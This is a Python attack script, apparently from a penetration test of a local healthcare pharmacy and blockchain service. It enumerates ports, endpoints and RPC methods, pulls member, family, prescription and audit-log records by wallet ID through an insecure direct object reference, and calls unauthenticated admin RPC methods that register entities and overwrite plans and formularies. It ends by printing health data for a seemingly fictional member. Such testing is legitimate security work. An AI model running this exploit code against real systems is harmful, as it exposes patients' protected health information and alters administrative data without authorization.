#!/usr/bin/env python3
"""
Comprehensive wallet ID discovery and PHI exposure test script.
Targets: http://host.docker.internal:3030 and ports 4002, 4003, 4004, 4005
"""

import requests
import json

BASE = "http://host.docker.internal:3030"

# Known wallet IDs discovered from local state files
KNOWN_WALLET_IDS = [
    # From l2-checkpoint receipts
    "19747508156620622363501620965441493007145760607291779984662425808718860176207",
    # From state.json enrolledMembers (Alice Johnson)
    "10984494935729519473550543185313856534563662852400800905634412742901337202588",
]

# Padded hex-style IDs to try
HEX_WALLET_IDS = [
    "0x" + "0" * 63 + str(i) for i in range(1, 11)
]

def section(title):
    print()
    print("=" * 80)
    print(f"  {title}")
    print("=" * 80)

def try_request(method, url, **kwargs):
    try:
        r = requests.request(method, url, timeout=5, **kwargs)
        print(f"  Status: {r.status_code}")
        try:
            body = r.json()
            print(f"  Body: {json.dumps(body, indent=2)[:600]}")
        except Exception:
            print(f"  Body (raw): {r.text[:600]}")
        return r
    except Exception as e:
        print(f"  ERROR: {e}")
        return None


# ─────────────────────────────────────────────────────────────────────────────
section("STEP 1: Port Accessibility Check")
# ─────────────────────────────────────────────────────────────────────────────

for port in [3030, 4002, 4003, 4004, 4005]:
    print(f"\n  Port {port}:")
    for path in ["/", "/health", "/status", "/node/state"]:
        url = f"http://host.docker.internal:{port}{path}"
        try:
            r = requests.get(url, timeout=3)
            print(f"    GET {path}: {r.status_code} | {r.text[:150]}")
        except Exception as e:
            print(f"    GET {path}: ERROR - {e}")


# ─────────────────────────────────────────────────────────────────────────────
section("STEP 2: Node State and Viz Entities Discovery")
# ─────────────────────────────────────────────────────────────────────────────

endpoints = [
    ("GET", f"{BASE}/node/state"),
    ("GET", f"{BASE}/viz/entities"),
    ("GET", f"{BASE}/viz/state"),
    ("GET", f"{BASE}/viz/lanes"),
    ("GET", f"{BASE}/interactive/state"),
    ("GET", f"{BASE}/node/members"),
    ("GET", f"{BASE}/node/wallets"),
    ("GET", f"{BASE}/node/registry"),
]
for method, url in endpoints:
    print(f"\n  {method} {url}")
    try_request(method, url)


# ─────────────────────────────────────────────────────────────────────────────
section("STEP 3: Claim Proof Enumeration (leafIndex 0-15)")
# ─────────────────────────────────────────────────────────────────────────────

for i in range(0, 16):
    url = f"{BASE}/node/claim-proof?leafIndex={i}"
    try:
        r = requests.get(url, timeout=5)
        print(f"  leafIndex={i}: {r.status_code} | {r.text[:200]}")
    except Exception as e:
        print(f"  leafIndex={i}: ERROR {e}")


# ─────────────────────────────────────────────────────────────────────────────
section("STEP 4: RPC Method Enumeration - Wallet / Member Discovery")
# ─────────────────────────────────────────────────────────────────────────────

rpc_methods = [
    ("l2_getWalletState",    {"walletId": "test"}),
    ("l2_getReceiptsByWallet", {"walletId": "test"}),
    ("l2_getMessagesByWallet", {"walletId": "test"}),
    ("l2_getMembers",        {}),
    ("l2_listWallets",       {}),
    ("l2_listMembers",       {}),
    ("l2_getRegistry",       {}),
    ("l2_getState",          {}),
    ("l2_getFormulary",      {}),
    ("l2_getPlans",          {}),
    ("l2_requestSnapshot",   {}),
]
for method, params in rpc_methods:
    print(f"\n  RPC: {method}")
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    try_request("POST", f"{BASE}/rpc", json=payload)


# ─────────────────────────────────────────────────────────────────────────────
section("STEP 5: RPC with Known Wallet IDs")
# ─────────────────────────────────────────────────────────────────────────────

for wid in KNOWN_WALLET_IDS:
    for method in ["l2_getWalletState", "l2_getReceiptsByWallet", "l2_getMessagesByWallet"]:
        print(f"\n  RPC {method} walletId={wid[:20]}...")
        payload = {"jsonrpc": "2.0", "method": method, "params": {"walletId": wid}, "id": 1}
        try_request("POST", f"{BASE}/rpc", json=payload)


# ─────────────────────────────────────────────────────────────────────────────
section("STEP 6: AUTHZ-VULN-07 - member-history PHI Exposure")
# ─────────────────────────────────────────────────────────────────────────────

# Try with known wallet IDs
for wid in KNOWN_WALLET_IDS:
    print(f"\n  GET /interactive/member-history?walletId={wid[:20]}...")
    url = f"{BASE}/interactive/member-history?walletId={wid}"
    try_request("GET", url)

# Try with hex-style padded wallet IDs
for wid in HEX_WALLET_IDS[:5]:
    print(f"\n  GET /interactive/member-history?walletId={wid}")
    url = f"{BASE}/interactive/member-history?walletId={wid}"
    try_request("GET", url)


# ─────────────────────────────────────────────────────────────────────────────
section("STEP 7: family-history PHI Exposure")
# ─────────────────────────────────────────────────────────────────────────────

for wid in KNOWN_WALLET_IDS:
    print(f"\n  GET /interactive/family-history?walletId={wid[:20]}...")
    url = f"{BASE}/interactive/family-history?walletId={wid}"
    try_request("GET", url)


# ─────────────────────────────────────────────────────────────────────────────
section("STEP 8: Cross-wallet / IDOR - member-history on alternate wallets")
# ─────────────────────────────────────────────────────────────────────────────

# Swap roles: use wallet from receipts (possibly a node/admin wallet) to query member endpoint
for wid in KNOWN_WALLET_IDS:
    for path in [
        f"/interactive/member-history?walletId={wid}",
        f"/interactive/family-history?walletId={wid}",
        f"/interactive/prescriptions?walletId={wid}",
        f"/interactive/fulfillments?walletId={wid}",
        f"/interactive/prior-auths?walletId={wid}",
        f"/interactive/audit-log?walletId={wid}",
    ]:
        url = f"{BASE}{path}"
        try:
            r = requests.get(url, timeout=5)
            print(f"  {r.status_code} {path[:80]} | {r.text[:200]}")
        except Exception as e:
            print(f"  ERROR {path[:80]} | {e}")


# ─────────────────────────────────────────────────────────────────────────────
section("STEP 9: Explorer / Viz endpoint enumeration on all ports")
# ─────────────────────────────────────────────────────────────────────────────

viz_paths = [
    "/viz/entities",
    "/viz/state",
    "/viz/members",
    "/viz/wallets",
    "/node/claim-proof?leafIndex=0",
    "/node/state",
    "/interactive/member-history",
    "/interactive/family-history",
]
for port in [4002, 4003, 4004, 4005]:
    print(f"\n  --- Port {port} ---")
    for path in viz_paths:
        url = f"http://host.docker.internal:{port}{path}"
        try:
            r = requests.get(url, timeout=3)
            print(f"    {r.status_code} {path} | {r.text[:150]}")
        except Exception as e:
            print(f"    ERROR {path} | {e}")


# ─────────────────────────────────────────────────────────────────────────────
section("STEP 10: RPC Admin methods (AUTHZ-VULN-01 - unauthenticated)")
# ─────────────────────────────────────────────────────────────────────────────

admin_methods = [
    ("l2_forceBatch", {}),
    ("l2_requestSnapshot", {}),
    ("l2_getFormulary", {}),
    ("l2_getPlans", {}),
    ("l2_storePlan", {"planId": "PLAN-TEST", "entries": []}),
    ("l2_storeFormulary", {"entries": []}),
    ("l2_registerEntity", {"entityType": "member", "walletId": "test_wallet"}),
]
for method, params in admin_methods:
    print(f"\n  Admin RPC: {method}")
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 99}
    try_request("POST", f"{BASE}/rpc", json=payload)


# ─────────────────────────────────────────────────────────────────────────────
section("SUMMARY - Discovered Wallet IDs")
# ─────────────────────────────────────────────────────────────────────────────
print("""
  From local state files:
  1. 19747508156620622363501620965441493007145760607291779984662425808718860176207
     Source: l2-checkpoint receipts (registration tx, possibly node/admin wallet)

  2. 10984494935729519473550543185313856534563662852400800905634412742901337202588
     Source: state.json enrolledMembers -> Alice Johnson (ACME-EMP-001)
     PHI: DOB 19850315, address 742 Evergreen Terrace Springfield IL 62704
          familyId FAM-ACME-10001, cardholderId ACME-EMP-001
     Has Prescription: RX-0001 Lisinopril 10mg (PARTIALLY_FILLED)
""")

print("Done.")
